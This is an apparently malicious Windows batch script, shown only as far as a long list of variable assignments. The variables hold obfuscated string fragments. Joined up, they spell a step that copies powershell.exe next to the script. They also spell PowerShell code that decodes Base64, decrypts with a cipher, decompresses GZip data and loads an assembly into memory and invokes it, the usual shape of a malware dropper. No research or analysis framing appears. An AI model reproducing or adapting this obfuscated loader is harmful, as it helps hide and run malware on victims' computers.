@echo off
set "dVyZoNmPsS=ws"
set "hOSKKfqzeI=Wi"
set "GtrdJGwtNG=Po"
set "JLODlqHQwN=rs"
set "ktFfTLBizB=ll"
set "XQUjqlxKuz=y "
set "IAhnMNsOzG=Sy"
set "mlJTWrprwk=rS"
set "tRdZzbLpyP=st"
set "NbckKMBFYc=xe"
set "MVzkfZamWF= C"
set "YOLDmGMsMs=do"
set "uSoDUEwIUF=he"
set "wDJNBdroII=.e"
set "lZaPGvKygs=\v"
set "HfdDlUdoID=ow"
set "yrtpAMCmPC=we"
set "QIuLaXcPAa=s\"
set "PgSUYuSzXz=po"
set "TjpdTwDFLV=nd"
set "reXDlFcQuV=1."
set "uNeLnhXPQy=32"
set "pUsjsSFDak=0\"
set "cbRBRlODdV=em"
set "TuyczfTTCU= /"
set "BoPbjZEvlZ=\W"
set "NDSVbrsQWn=ll"
set "PhxWDlmcER=he"
set "sdPRVHsZjh=co"
set "mNrKXGIGwB=in"
set "WISsdXwPUh=:\"
set "UYBBnfwcTn=we"
set "CVHLAnxpSi=py"
set "QyJzYgeFry= %~dp0"
set "CtLzbDIzQZ=cd"
set "qqNoYsqXMC=();$"
set "uePfXqrYpo=tS46"
set "lvKlaDSgjz=daeR"
set "igitaIkCUl=raph"
set "EbNVkjifwJ=ing("
set "gJhFvpvxbz=YT ="
set "RdevCpQzps=grap"
set "ZEBKcwzpUF=('da"
set "BrPDxCHZJZ=em.I"
set "SVyWsZTeld=[Sys"
set "AtNYYaLzSN=Disp"
set "hvobtPBtlb=pStr"
set "cRvFGsPBTk=eZw."
set "LyqxKjTtCf=rity"
set "cGtvlcLtyn=fore"
set "mVkgpTOiCH=gth)"
set "CADqJeyODX=pDZz"
set "QMolHXaZty=);$A"
set "NQZBcupsTq=$amG"
set "oPgazSXcmy=embl"
set "wXBGmrxdXz=New-"
set "VVMBFPrIpc=gMod"
set "ZxoUMintbE=dfIH"
set "DcGtHNoZRT='[-1"
set "OqmimnARbG=;$qy"
set "sBmsyabpAL=]::("
set "WIRZEOEBXo=y.Ci"
set "aoQHnjburt=sGUc"
set "MdUyWJqStN=yTo("
set "dybJEbjKXz=$AXs"
set "nrVmQvXgsT= = ["
set "MOQHkpOlYb=TllA"
set "ScQwQOKaLN=.Com"
set "XMJwIRoOjl=pose"
set "krKelAFcwu=HhA "
set "FseJxTYgiT=null"
set "yDHiNImIga=, $z"
set "FGgyZgdgjV=H, 0"
set "daWaaptTWM=Xsxh"
set "AzGMdvGaID=h.Pa"
set "TZcUULhGDZ='dqR"
set "LrqChjcIAQ=$zdf"
set "uycYpiPvpr=S46e"
set "LMxKbAbrLE=form"
set "xxxzIzgdDz=[IO."
set "KjWzziclUK=v4Ir"
set "HVuWrEEnhp=ke($"
set "mRsvHAOTtG=iRfC"
set "rptzPMouxJ=Star"
set "htoWMInlQP=QP);"
set "MqeiciNOrV=bstr"
set "jJYIbsPXMn=ispo"
set "pMOsioYenH=ose("
set "iaFIFSQddB=.Ass"
set "EmvmbOnyjU=1..-"
set "kUGgifaekQ=eam("
set "osItkDPixv=hy.A"
set "aWwOmRnGbz=join"
set "lPqzAwSLHQ=1] -"
set "tUOfoRZwQF=pher"
set "OtDQExpITe=-1.."
set "ZNbLlZQIAT=sion"
set "pNYldaBGwo=T) {"
set "iejXatHtJv= '')"
